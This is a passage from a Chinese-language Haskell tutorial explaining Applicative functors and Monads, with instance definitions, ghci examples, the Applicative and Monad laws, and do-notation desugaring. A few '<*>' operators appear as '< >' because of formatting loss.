\u51fd\u6570\u4e00\u6837\u662f\u9ed8\u8ba4\u5de6\u7ed3\u5408\u7684\uff0cpure (+) < > Just 3 < > Just 9 \u76f8\u5f53\u4e8e (pure (+) < > Just 3) < > Just 9\uff0c\u800c pure (+) < > Just 3 \u5c06 (+) \u5e94\u7528\u5728Just 3 \u4e0a\uff0c\u5f97\u5230\u7684\u5c31\u662f Just (+3) \u4e00\u4e2a\u5305\u542b\u51fd\u6570\u7684\u51fd\u5b50\uff0c\u53c8\u5c06\u5176\u901a\u8fc7 < > \u5e94\u7528\u5728\u4e86 Just 9 \u4e0a\uff0c\u5f97\u5230\u4e86 Just 12: pure ( \\ x y z -> x + y + z ) <*> Just 3 <*> Just 4 <*> Just 5 = ( pure ( \\ x y z -> x + y + z ) <*> Just 3 ) <*> Just 4 <*> Just 5 = ( Just ( \\ y z -> 3 + y + z ) <*> Just 4 ) <*> Just 5 = Just ( \\ z -> 3 + 4 + z ) <*> Just 5 = Just ( + 7 ) <*> Just 5 = Just 12 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c pure f < > x < > y <*> ... \u6765\u5c06\u4e00\u4e2a\u666e\u901a\u591a\u5143\u51fd\u6570f\u5e94\u7528\u5728\u591a\u4e2a\u51fd\u5b50\u4e0a\u3002 \u800c\u4e14 pure f < > x \u5b9e\u9645\u4e0a\u5148\u5c06\u666e\u901a\u51fd\u6570f\u653e\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u6267\u884c < > \u65f6\u518d\u5c06\u5176\u63d0\u53d6\u51fa\u6765\u6267\u884c fmap\uff0c\u6240\u4ee5\u5b83\u5c31\u76f8\u5f53\u4e8e\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u51fd\u5b50 x \u4e0a\uff0c\u5373 fmap f x\uff0c\u4e5f\u53ef\u4ee5\u5199\u6210 f <$> x\u3002\u6240\u4ee5\u5e38\u7528\u7684\u5199\u6cd5\u5c31\u662f\uff1a f < $> x < *> y < *> ... [] \u00b6 \u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff1a instance Applicative [] where pure x = [ x ] fs <*> xs = [ f x | f <- fs , x <- xs ] - pure \u51fd\u6570\uff1a\u5bf9\u4e8e\u5217\u8868\u800c\u8a00\uff0c\u4e00\u4e2a\u503c\u7684\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u662f\u53ea\u5305\u542b\u8fd9\u4e2a\u503c\u7684\u5217\u8868 [x] - <*> \u51fd\u6570\uff1a\u5217\u8868\u7684 <*> \u51fd\u6570\u662f\u901a\u8fc7\u5217\u8868\u63a8\u5bfc\u6765\u5b9e\u73b0\u7684\u3002\u56e0\u4e3a\u4e0d\u540c\u4e8e Maybe \u7684 Just \u53ea\u5305\u542b\u4e00\u4e2a\u503c\uff0c\u5217\u8868\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u503c\uff0c\u7b2c\u4e00\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e2d\u53ef\u80fd\u4f1a\u5305\u542b\u5f88\u591a\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u4f20\u5165\u7684\u5217\u8868\u4e5f\u4f1a\u5305\u542b\u5f88\u591a\u503c\uff0c\u6240\u4ee5\u5c31\u9700\u8981\u5148\u4ece\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u53d6\u51fa\u4e00\u4e2a\u51fd\u6570\u7136\u540e\u4f9d\u6b21\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\uff0c\u518d\u53d6\u51fa\u7b2c\u4e00\u4e2a\u5217\u8868\u4e2d\u7684\u7b2c\u4e8c\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e8c\u4e2a\u5217\u8868\u7684\u6bcf\u4e2a\u503c\u4e2d\u2026\u2026\u6700\u7ec8\u8fd4\u56de\u5f97\u5230\u7684\u6240\u6709\u7ed3\u679c\u7684\u5217\u8868 \u4f7f\u7528\u4f8b\u5b50\uff1a ghci > [( + 3 ), ( * 2 )] <*> [ 1 , 2 ] [ 4 , 5 , 2 , 4 ] ghci > [( + ), ( * )] <*> [ 1 , 2 ] <*> [ 3 , 4 ] [ 4 , 5 , 5 , 6 , 3 , 4 , 6 , 8 ] IO \u00b6 instance Applicative IO where pure = return a <*> b = do f <- a x <- b return ( f x ) \u4e5f\u4e0d\u96be\u7406\u89e3\uff0cpure \u51fd\u6570\u76f4\u63a5\u5c06\u4f20\u5165\u7684\u503c return\uff0c\u76f8\u5f53\u4e8e\u653e\u5728\u4e86 IO \u7684\u4e0a\u4e0b\u6587\u4e2d\u3002\u800c <*> \u51fd\u6570\u5148\u5c06\u4e24\u4e2a IO \u4e2d\u5185\u5bb9\u63d0\u53d6\u51fa\u6765\uff0c\u7136\u540e\u5e94\u7528\u51fd\u6570\u540e return\uff0c\u5f62\u6210\u65b0\u7684 IO \u51fd\u5b50 ghci > ( ++ ) <$> getLine <*> getLine Line1 Line2 \"Line1Line2\" (->) r \u00b6 (->) r \u540c\u6837\u4e5f\u662f\u4e00\u4e2a\u5e94\u7528\u51fd\u5b50\uff0c\u548c\u51fd\u5b50\u7684\u5206\u6790\u4e00\u6837\uff0c\u5148\u6765\u5206\u6790\u5b83\u7684 <*> \u51fd\u6570\u7684\u7c7b\u578b\u7b7e\u540d\uff1a < *> :: f (a -> b) -> f a -> f b \u5176\u4e2d f \u4e3a (->) r\uff0c\u5c06\u5176\u4ee3\u5165\u5e76\u66ff\u6362\u4e3a\u4e2d\u7f00\uff1a < *> :: (r -> a -> b) -> (r -> a) -> (r -> b) \u53ef\u4ee5\u770b\u51fa\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -> a -> b\u3001g :: r -> a\uff0c\u8fd4\u56de\u53e6\u4e00\u4e2a\u51fd\u6570 h :: (r -> b) \u90a3\u4e48\u8fd4\u56de\u7684\u51fd\u6570\u7684\u8f93\u5165\u4e3a r\uff0c\u8f93\u51fa\u4e3a b\uff0c\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528\u51fd\u6570 g \u5f97\u5230 a\uff0c\u7136\u540e\u5728\u5bf9 r \u548c a \u5e94\u7528 f \u5f97\u5230 b\uff0c\u6240\u4ee5\u63a8\u6d4b <*> \u51fd\u6570\u7684\u64cd\u4f5c\u5c31\u662f\uff1a \\x -> f x (g x) \u4e8e\u662f\uff1a instance Applicative (( -> ) r ) where pure x = ( \\ _ -> x ) f <*> g = \\ x -> f x ( g x ) \u5c06\u4e00\u4e2a\u503c\u653e\u5728\u51fd\u6570\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u6700\u5c0f\u4e0a\u4e0b\u6587\u5c31\u5e94\u8be5\u8fd4\u56de\u8fd9\u4e2a\u503c\u672c\u8eab\uff0c\u6240\u4ee5 pure \u51fd\u6570\u5b9a\u4e49\u4e3a (_ -> x)\uff0c\u5373\u65e0\u8bba\u8f93\u5165\u4ec0\u4e48\uff0c\u90fd\u8fd4\u56de x \u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u5b50\u3002\u5bf9\u4e8e (->) r\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570\u3002\u5177\u4f53\u4f8b\u5b50\uff1a ghci > ( + ) <$> ( + 3 ) <*> ( * 100 ) $ 5 508 \u6267\u884c\u8fd9\u53e5\u65f6\u53d1\u751f\u4e86\u4ec0\u4e48\uff1f\uff1a ( + ) <$> ( + 3 ) <*> ( * 100 ) $ 5 = (( + ) <$> ( + 3 )) <*> ( * 100 ) $ 5 = (( + ) . ( + 3 )) <*> ( * 100 ) $ 5 = ( \\ a -> ( + ) (( + 3 ) a )) <*> ( * 100 ) $ 5 = ( \\ a b -> ( a + 3 + b )) <*> ( * 100 ) $ 5 = ( \\ x -> x + 3 + (( * 100 ) x )) $ 5 = ( \\ x -> x + 3 + x * 100 ) $ 5 = 5 + 3 + 5 * 100 = 508 = ( 5 + 3 ) + ( 5 * 100 ) \u6240\u4ee5\u5c31\u76f8\u5f53\u4e8e\u5148\u5bf9\u8f93\u5165\u5206\u522b\u6267\u884c (+3) \u548c (*100)\uff0c\u7136\u540e\u5c06\u4e24\u4e2a\u7ed3\u679c\u6267\u884c\u4e86 (+) \u540c\u6837\uff1a ghci > ( \\ x y z -> [ x , y , z ]) <$> ( + 3 ) <*> ( * 2 ) <*> ( / 2 ) $ 5 [ 8.0 , 10.0 , 2.5 ] \u5148\u5bf9 5 \u5206\u522b\u6267\u884c (+3)\u3001(*2)\u3001(/2)\uff0c\u7136\u540e\u5c06\u5f97\u5230\u7684\u4e09\u4e2a\u7ed3\u679c\u4f20\u5165 (\\x y z -> [x,y,z]) \u5f97\u5230\u4e86\u6700\u7ec8\u7684\u7ed3\u679c f <$> g <*> h <*> i = ( \\ x -> f ( g x ) ( h x ) ( i x )) ZipList \u00b6 \u666e\u901a\u5217\u8868\u5b9e\u73b0\u7684 <*> \u51fd\u6570\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u6240\u6709\u503c\u4e0a\uff0c\u4f46\u8fd8\u6709\u4e00\u79cd\u5b9e\u73b0\u65b9\u6cd5\u662f\u5c06\u6bcf\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u5bf9\u5e94\u503c\u4e0a\uff0c\u56e0\u4e3a\u540c\u4e00\u4e2a\u7c7b\u578b\u4e0d\u80fd\u5b58\u5728\u540c\u4e00\u51fd\u6570\u7684\u4e24\u79cd\u5b9e\u73b0\u5f62\u5f0f\uff0c\u6240\u4ee5\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u5217\u8868 ZipList\uff0c\u5305\u542b\u5728 Control.Applicative \u6a21\u5757\u4e2d instance Applicative ZipList where pure x = ZipList ( repeat x ) ZipList fs <*> ZipList xs = ZipList ( zipWith ( $ ) fs xs ) \u4f46\u662f ZipList \u5e76\u4e0d\u662f Show \u7684\u5b9e\u4f8b\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u663e\u793a\u51fa\u6765\uff0c\u8981\u4f7f\u7528 getZipList \u6765\u83b7\u53d6\u5b83\u5185\u90e8\u7684\u5217\u8868\uff1a ghci > getZipList $ ( + ) <$> ZipList [ 1 , 2 , 3 ] <*> ZipList [ 100 , 100 .. ] [ 101 , 102 , 103 ] ghci > getZipList $ (,,) <$> ZipList \"dog\" <*> ZipList \"cat\" <*> ZipList \"rat\" [( 'd' , 'c' , 'r' ),( 'o' , 'a' , 'a' ),( 'g' , 't' , 't' )] Applicative Functor Laws \u00b6 \u5e94\u7528\u51fd\u5b50\u4e00\u822c\u6709\u56db\u4e2a\u5b9a\u5f8b\uff0c\u90fd\u662f\u4fdd\u8bc1 pure \u7684\u6b63\u786e\u6027\u7684\uff1a Identity law \uff1apure id <*> v = v Homomorphism \uff1apure f <*> pure x = pure (f x) Interchange \uff1au < > pure v = pure ($ v) < > u Composition \uff1au < > (v < > w) = pure (.) < > u < > v <*> w Intuition \u00b6 \u7406\u89e3\u5e94\u7528\u51fd\u5b50\u7684\u65b9\u5f0f\u4e5f\u662f\u5c06\u5176\u770b\u4f5c\u662f\u8ba1\u7b97\u4e0a\u4e0b\u6587\uff08context\uff09\uff0c\u6bd4\u5982\u8981\u8ba1\u7b97\uff1a \\[ [[\\ \\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ \\ ]] \\] \u5176\u4e2d \\(x_i\\) \u7684\u7c7b\u578b\u662f \\(f\\ t_i\\) \uff0c \\(f\\) \u662f\u5e94\u7528\u51fd\u5b50\uff08\u770b\u4f5c\u4e0a\u4e0b\u6587\uff09\u3002\u800c\u51fd\u6570 \\(g\\) \u7684\u7c7b\u578b\u662f\uff1a \\[ t_1\\to t_2\\to\\cdots\\to t_n\\to t \\] \u6240\u4ee5\u53cc\u62ec\u53f7\uff08idiom brackets\uff09\u7684\u4f5c\u7528\u662f\u5c06\u4e00\u4e2a\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u5305\u542b\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\u3002 \\(g\\ x_1\\) \u53ef\u4ee5\u901a\u8fc7 fmap \u6765\u6267\u884c\uff0c\u5c06 \\(g\\) \u63d0\u5347\uff08lift\uff09\u5230 \\(x_1\\) \u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u7136\u540e\u5e94\u7528\u5728 \\(x_1\\) \u4e0a\u3002\u4f46\u662f fmap \u8fd4\u56de\u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u51fd\u5b50\uff0c\u6362\u53e5\u8bdd\u8bf4\uff0c \\(g\\ x_1\\) \u7ed3\u679c\u7684\u7c7b\u578b\u662f\uff1a \\[ f\\ \\ (t_2\\to t_3\\to\\cdots\\to t_n\\to t) \\] \u4f46\u662f fmap \u5e76\u4e0d\u80fd\u5c06\u4e0a\u4e0b\u6587\u4e2d\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u53c2\u6570\u4e0a\uff0c\u4e8e\u662f\u5e94\u7528\u51fd\u5b50\u7684 <*> \u51fd\u6570\u63d0\u4f9b\u4e86\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u6240\u4ee5\u8ba1\u7b97 \\([[\\ g\\ x_1\\ x_2\\ \\cdots\\ x_n\\ ]]\\) \uff0c\u53ea\u9700\u8981\uff1a g < $> x1 < *> x2 < *> ... < *> xn \u800c pure \u51fd\u6570\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u4e00\u4e2a\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\uff08\u51fd\u6570\u6216\u53c2\u6570\uff09\u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\uff0c\u4f46\u4e0d\u8fdb\u884c\u5176\u4ed6\u64cd\u4f5c\u3002\u6bd4\u5982\u53c2\u6570 \\(x_2\\) \u5982\u679c\u4e0d\u5728\u4e0a\u4e0b\u6587\u4e2d\uff0c\u9700\u8981\u7528 pure \u63d0\u5347\u5230\u4e0a\u4e0b\u6587\u4e2d\u624d\u80fd\u6309\u4e0a\u9762\u8ba1\u7b97\uff1a g < $> x1 < *> pure x2 < *> ... < *> xn \u5e38\u7528\u51fd\u6570 \u00b6 liftA & liftA2 & liftA3 \u00b6 liftA :: Applicative f => (a -> b) -> f a -> f b liftA2 :: Applicative f => (a -> b -> c) -> f a -> f b -> f c liftA3 :: Applicative f => (a -> b -> c -> d) -> f a -> f b -> f c -> f d \u4e0d\u96be\u63a8\u6d4b liftA \u5c31\u662f fmap\uff0c liftA2 f x1 x2 \u76f8\u5f53\u4e8e f <$> x1 <*> x2 \uff0c liftA3 f x1 x2 x3 \u76f8\u5f53\u4e8e f <$> x1 <*> x2 <*> x3 <* & *> \u00b6 \u7c7b\u578b\u7c7b\u4f3c\u51fd\u5b50\u7684 <$ \u548c $> \uff1a (<*) :: Applicative f => f a -> f b -> f a (*>) :: Applicative f => f a -> f b -> f b <* \u63a5\u6536\u4e24\u4e2a\u51fd\u5b50\uff0c\u5982\u679c\u4e24\u4e2a\u51fd\u5b50\u4e2d\u53c8\u4e00\u4e2a\u4e3a\u7a7a\uff0c\u5c31\u8fd4\u56de\u7a7a\uff0c\u5426\u5219\u8fd4\u56de\u7684\u7c7b\u578b\u4e0e\u7b2c\u4e00\u4e2a\u51fd\u5b50\u76f8\u540c\u3002*> \u53cd\u8fc7\u6765 ghci > Just 3 <* Just 4 Just 3 ghci > Just 3 *> Just 4 Just 4 ghci > Nothing <* Just 3 Nothing ghci > Nothing *> Just 3 Nothing ghci > [ 1 , 2 , 3 ] <* [ 3 , 4 ] [ 1 , 1 , 2 , 2 , 3 , 3 ] ghci > [ 1 , 2 , 3 ] *> [ 3 , 4 ] [ 3 , 4 , 3 , 4 , 3 , 4 ] ghci > [] <* [ 1 , 2 , 3 ] [] ghci > [] *> [ 1 , 2 , 3 ] [] <**> \u00b6 ( < **>) :: Applicative f => f a -> f (a -> b) -> f b \u63a5\u6536\u7684\u53c2\u6570\u662f <*> \u53cd\u8f6c\u8fc7\u6765\u7684\uff0c\u5373\u5148\u63a5\u6536\u4e00\u4e2a\u53c2\u6570\u51fd\u5b50\uff0c\u7136\u540e\u63a5\u6536\u4e00\u4e2a\u51fd\u6570\u51fd\u5b50\uff0c\u5728\u5c06\u5176\u5e94\u7528\u8fd4\u56de\u3002\u4f46\u662f\u548c flip(<*>) \u4e0d\u540c\uff0c\u5b83\u5148\u53d6\u53c2\u6570\u51fd\u5b50\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u7136\u540e\u518d\u53d6\u51fd\u6570\u51fd\u5b50\u4e2d\u7684\u51fd\u6570\u9010\u4e2a\u5e94\u7528\uff1a ghci > [( + 1 ), ( + 2 ), ( + 3 )] <*> [ 1 , 2 ] [ 2 , 3 , 3 , 4 , 4 , 5 ] ghci > [ 1 , 2 ] <**> [( + 1 ), ( + 2 ), ( + 3 )] [ 2 , 3 , 4 , 3 , 4 , 5 ] ghci > flip ( <*> ) [ 1 , 2 ] [( + 1 ), ( + 2 ), ( + 3 )] [ 2 , 3 , 3 , 4 , 4 , 5 ] when & unless \u00b6 when :: Applicative f => Bool -> f () -> f () \u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u662f\u4e00\u4e2a\u7ed3\u679c\u4e3a Bool \u7c7b\u578b\u7684\u6d4b\u8bd5\uff0c\u5982\u679c\u6d4b\u8bd5\u4e3a True\uff0c\u5219\u8c03\u7528\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5426\u5219\u8fd4\u56de pure ()\u3002\uff08when \u51fd\u6570\u5728\u4e0a\u6587 IO \u64cd\u4f5c\u4e2d\u4f7f\u7528\u8fc7\uff09 unless \u5219\u4e0e when \u76f8\u53cd\uff0c\u6d4b\u8bd5\u4e3a True \u8fd4\u56de pure () sequenceA \u00b6 sequenceA :: (Traversable t, Applicative f) => t (f a) -> f (t a) \u5e94\u7528\u5728\u5217\u8868\u4e0a\u65f6\uff0c\u5b83\u7684\u7c7b\u578b\u76f8\u5f53\u4e8e\uff1a [f a] -> f [a] \u6240\u4ee5\u5728\u5217\u8868\u4e0a\u5b83\u7684\u4f7f\u7528\u65b9\u6cd5\uff1a ghci > sequenceA [ Just 3 , Just 2 , Just 1 ] Just [ 3 , 2 , 1 ] ghci > sequenceA [ Just 3 , Nothing , Just 1 ] Nothing ghci > sequenceA [( + 3 ),( + 2 ),( + 1 )] 3 [ 6 , 5 , 4 ] ghci > sequenceA [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ]] [[ 1 , 4 ],[ 1 , 5 ],[ 1 , 6 ],[ 2 , 4 ],[ 2 , 5 ],[ 2 , 6 ],[ 3 , 4 ],[ 3 , 5 ],[ 3 , 6 ]] ghci > sequenceA [[ 1 , 2 , 3 ],[ 4 , 5 , 6 ],[ 3 , 4 , 4 ], [] ] [] \u5b83\u5728\u5bf9\u540c\u4e00\u4e2a\u53c2\u6570\u5e94\u7528\u4e0d\u540c\u51fd\u6570\u65f6\u5f88\u6709\u7528\uff1a ghci > map ( \\ f -> f 7 ) [( > 4 ), ( < 10 ), odd ] [ True , True , True ] ghci > sequenceA [( > 4 ), ( < 10 ), odd ] 7 [ True , True , True ] Monad \u00b6 \u5355\u5b50\uff08Monad\uff09\u662f\u5bf9 Applicative Functor \u7684\u6269\u5c55\uff08\u4f46\u662f\u8bde\u751f\u6bd4 Applicative \u65e9\uff09\uff0cFunctor \u7684 <$> \u51fd\u6570\u5b9e\u73b0\u4e86\u5c06\u666e\u901a\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff0cApplicative \u7684 <*> \u51fd\u6570\u5c06\u4e0a\u4e0b\u6587\u4e2d\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\u3002\u800c Monad \u63d0\u4f9b\u4e86\u4e00\u4e2a\u51fd\u6570 >>= \uff08bind\uff09\uff0c\u5c06\u4e00\u4e2a\u63a5\u6536\u666e\u901a\u503c\u8fd4\u56de\u4e0a\u4e0b\u6587\u503c\u7684\u51fd\u6570\u5e94\u7528\u5728\u4e0a\u4e0b\u6587\u503c\u4e0a\uff1a class Applicative m => Monad m where ( >>= ) :: m a -> ( a -> m b ) -> m b ( >> ) :: m a -> m b -> m b return :: a -> m a m >> n = m >>= \\ _ -> n return = pure return \u51fd\u6570\uff1a\u548c pure \u4e00\u6837\uff0c\u53ea\u662f\u6709\u53e6\u4e00\u4e2a\u540d\u5b57 >> \u51fd\u6570\uff1a\u63d0\u4f9b\u4e86\u9ed8\u8ba4\u7684\u5b9e\u73b0\u65b9\u6cd5\uff0c\u5b83\u7684\u4f5c\u7528\u548c Applicative \u7684 *> \u51fd\u6570\u4e00\u6837 >>= \u51fd\u6570\uff08bind\uff09\uff1a\u6bd4 Applicative \u5347\u7ea7\u7684\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u63a5\u6536\u503c\u8fd4\u56de\u5355\u5b50\u7684\u51fd\u6570\uff0c\u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728\u7b2c\u4e00\u4e2a\u53c2\u6570\u5355\u5b50\u4e2d\u7684\u503c\u4e0a\uff0c\u5e76\u8fd4\u56de\u5f97\u5230\u7684\u65b0\u5355\u5b50 Monad \u5b9e\u4f8b \u00b6 Maybe \u00b6 Maybe \u662f\u4e00\u4e2a\u5355\u5b50\u5b9e\u4f8b\uff0cApplicative \u5df2\u7ecf\u4e3a\u5b83\u5b9e\u73b0\u4e86 return\uff0c\u56e0\u6b64\u53ea\u9700\u8981 >>= \u51fd\u6570\uff1a instance Monad Maybe where ( Just x ) >>= f = f x Nothing >>= _ = Nothing \u6839\u636e\u5b9a\u4e49\u5c31\u5f88\u5bb9\u6613\u5b9e\u73b0 Maybe \u7684 >>= \u51fd\u6570\u4e86\uff0c\u800c\u4e14\u4e5f\u5f88\u597d\u7406\u89e3 ghci > Just 1 >>= \\ x -> Just ( x + 1 ) Just 2 ghci > Just 1 >>= \\ x -> return ( x + 1 ) Just 2 ghci > Nothing >>= \\ x -> Just ( x + 1 ) Nothing ghci > Just 1 >>= \\ x -> Just ( x + 1 ) >> Nothing >>= \\ y -> Just ( y + 1 ) Nothing \u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2d\u51fa\u73b0\u4e86 >> Nothing\uff0c\u8fd9\u65f6 Nothing \u524d\u7684\u90e8\u5206\u5168\u90fd\u76f8\u5f53\u4e8e\u6ca1\u7528\uff0c\u56e0\u4e3a >> \u64cd\u4f5c\u7b26\u7684\u5de6\u53f3\u4e24\u8fb9\u53ea\u8981\u6709\u4e00\u4e2a\u51fa\u73b0 Nothing\uff0c\u90a3\u6574\u4f53\u5c31\u4f1a\u662f Nothing\u3002\u8fd9\u4e2a\u7279\u6027\u53ef\u4ee5\u7528\u4e8e\u5728\u4e2d\u9014\u968f\u65f6\u5224\u65ad\u5931\u8bef\uff0c\u53ea\u8981\u6709\u4e00\u5904\u5931\u8bef\uff0c\u7ed3\u679c\u5c31\u4f1a\u662f Nothing [] \u00b6 \u5217\u8868\u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff1a instance Monad [] where xs >>= f = concat ( map f xs ) \u5c06\u8fd9\u4e2a\u51fd\u6570\u5e94\u7528\u5728 xs \u7684\u6bcf\u4e2a\u503c\u4e0a\uff0c\u5c06\u8fd4\u56de\u7684\u6240\u6709\u5217\u8868\u5e73\u94fa\u6210\u4e00\u4e2a\u5217\u8868\uff1a ghci > [ 3 , 4 , 5 ] >>= \\ x -> [ x , - x ] [ 3 , - 3 , 4 , - 4 , 5 , - 5 ] ghci > [ 1 , 2 ] >>= \\ n -> [ 'a' , 'b' ] >>= \\ ch -> return ( n , ch ) [( 1 , 'a' ),( 1 , 'b' ),( 2 , 'a' ),( 2 , 'b' )] IO \u00b6 IO \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u4f46\u662f\u5b9e\u73b0\u65b9\u6cd5\u6bd4\u8f83\u6df1\u5965\uff08\u9003 (->) r \u00b6 (->) r \u4e5f\u662f\u4e00\u4e2a\u5355\u5b50\uff0c\u548c Functor\u3001Applicative \u4e00\u6837\uff0c\u5148\u5206\u6790\u5b83\u7684 >>= \u7c7b\u578b\u7b7e\u540d\uff1a (>>=) :: (-> r) a -> (a -> (-> r) b) -> (-> r) b (>>=) :: (r -> a) -> (a -> r -> b) -> (r -> b) \u4e5f\u53ef\u4ee5\u770b\u51fa\u6765\uff0c\u5b83\u63a5\u6536\u4e24\u4e2a\u51fd\u6570 f :: r -> a\u3001g :: a -> r -> b\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u51fd\u6570 h :: r -> b \u90a3\u4e48\u51fd\u6570 h \u63a5\u6536\u4e00\u4e2a\u7c7b\u578b\u4e3a r \u7684\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u7c7b\u578b\u4e3a b \u7684\u503c\u3002\u6240\u4ee5\u5148\u5bf9\u8f93\u5165\u5e94\u7528 f \u5f97\u5230\u7c7b\u578b\u4e3a a \u7684\u4e2d\u95f4\u503c\uff0c\u7136\u540e\u518d\u5c06\u8fd9\u4e2a\u503c\u548c\u8f93\u5165\u53c2\u6570\u4e00\u8d77\u4f20\u5165\u51fd\u6570 g \u5f97\u5230\u7ed3\u679c\u3002\u6240\u4ee5\u51fd\u6570 h \u7684\u5b9a\u4e49\u5e94\u8be5\u662f\uff1a \\x -> g (f x) x instance Monad (( -> ) r ) where f >>= g = \\ x -> g ( f x ) x ghci > ( + 3 ) >>= ( + ) $ 1 5 ghci > ( + ) <$> ( + 3 ) <*> id $ 1 5 do-notation \u00b6 Haskell \u7684 do \u8bed\u53e5\u4e3a\u94fe\u5f0f\u7684 >>= \u5e94\u7528\u63d0\u4f9b\u4e86\u7c7b\u4f3c\u547d\u4ee4\u5f0f\uff08imperative style\uff09\u7684\u8bed\u6cd5\u7cd6\u3002\u6bd4\u5982 a >>= \\x -> b >> c >>= \\y -> d \uff1a a >>= \\ x -> b >> c >>= \\ y -> d \u5176\u4e2d\u6709 abcd \u56db\u4e2a\u503c\uff0c\u53ef\u4ee5\u770b\u51fa a \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 x \u4e0a\uff0cc \u4e2d\u5185\u5bb9\u7ed1\u5b9a\u5230\u4e86 y \u4e0a\u3002\u4f7f\u7528 do \u8bed\u53e5\u6765\u8868\u793a\u8fd9\u4e2a\u64cd\u4f5c\u53ef\u4ee5\u5199\u6210\uff1a do { x <- a ; b ; y <- c ; d } \u5176\u4e2d\u7684\u5927\u62ec\u53f7\u548c\u5206\u53f7\u53ef\u4ee5\u7701\u7565\u4e0d\u5199\uff08\u6324\u5728\u4e00\u884c\u65f6\u4e0d\u80fd\u7701\u7565\uff09\u3002do \u8bed\u53e5\u4e5f\u53ea\u662f\u4e00\u4e2a\u8bed\u6cd5\u7cd6\uff0c\u5b83\u53ef\u4ee5\u9012\u5f52\u5730\u8f6c\u6362\u6210\u666e\u901a\u7684 Monad \u64cd\u4f5c\u8bed\u53e5\uff1a do e \uff1ae do { e; ... } \uff1ae >> do { ... } do { v <- e; ... } \uff1ae >>= \\v -> do { ... } do { let ...; ... } \uff1alet ... in do { ... } ApplicativeDo \u00b6 \u6bd4\u5982\u5982\u4e0b\u4e00\u4e2a do \u8bed\u53e5\uff1a do x <- a y <- b z <- c return ( f x y z ) \u5b83\u53ef\u4ee5\u8f6c\u5316\u6210\uff1a a >>= \\x -> b >>= \\y -> c >>= \\z -> return (f x y z) \u4f46\u662f\u7ecf\u8fc7\u89c2\u5bdf\u53ef\u4ee5\u53d1\u73b0\uff0c\u6574\u4e2a\u8bed\u53e5\u5b9e\u9645\u4e0a\u5c06\u51fd\u6570 f \u5e94\u7528\u5728\u4e86\u4e09\u4e2a\u4e0a\u4e0b\u6587\u4e2d\u7684\u503c\u4e0a\uff0c\u6240\u4ee5\u4ec5\u7528 Applicative \u7684 <$> \u548c <*> \u5b8c\u5168\u53ef\u4ee5\u5b9e\u73b0\uff1a f < $> a < *> b < *> c \u800c\u4e14\u5728\u8fd0\u884c\u7684\u65f6\u5019 Applicative \u7684\u6548\u7387\u4f1a\u6bd4 Monad \u9ad8\uff0c\u6240\u4ee5 Haskell \u4f1a\u5c06 do \u8bed\u53e5\u5c3d\u53ef\u80fd\u4f18\u5148\u8f6c\u6362\u4e3a Applicative \u7684\u8868\u793a\u65b9\u6cd5\u7136\u540e\u518d\u8ba1\u7b97 Monad Laws \u00b6 Left identity \uff1areturn a >>= k = k a Right identity \uff1am >>= return = m Associativity \uff1a(m >>= g) >>= h = m >>= (\\x -> g x >>= h) \u524d\u4e24\u4e2a\u5b9a\u5f8b\u5f88\u597d\u7406\u89e3\uff1a \u5c06 a \u6ce8\u5165\u4e0a\u4e0b\u6587\u4e4b\u540e\u7ed1\u5b9a\uff08bind\uff09\u7ed9\u51fd\u6570 k(:: a -> m 